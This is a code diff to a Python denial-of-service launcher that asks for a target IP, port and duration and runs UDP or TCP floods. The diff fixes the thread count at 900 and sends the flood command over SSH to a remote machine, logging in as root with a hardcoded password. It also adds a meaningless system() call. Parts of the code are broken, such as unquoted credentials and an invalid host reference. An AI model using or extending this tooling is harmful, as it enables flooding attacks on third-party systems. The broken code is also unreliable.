@@ -10,7 +10,11 @@ import threading
 import sys
 import ssl
 import datetime
+import paramiko
 import os
+from os import system
+system("$ watermelon | [2 bots]")
+ssh = paramiko.SSHClient()
 
 print("""
                _                           _             
@@ -61,10 +65,11 @@ layer4input = input("""
 if layer4input == "UDP":
     ipudp = input(f"ip ══ ")
     portudp = input(f"port ══ ")
-    threadsudp = input(f"threads ══ ")
+    
     timeudp = input(f"time ══ ")
-    cmdudp = 'cd files/dont_look && python3 start.py UDP ' + ipudp + ':' + portudp + ' ' + threadsudp + ' ' + timeudp
-    os.system(cmdudp)
+    cmdudp = 'cd files/dont_look && python3 start.py UDP ' + ipudp + ':' + portudp + ' ' + '900' + ' ' + timeudp
+    ssh.connect(ssh.surf, username=root, password=RHE8Y5cqjK, port=8227)
+    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(cmdudp)
 
 if layer4input == "TCP":
     iptcp = input(f"ip ══ ")
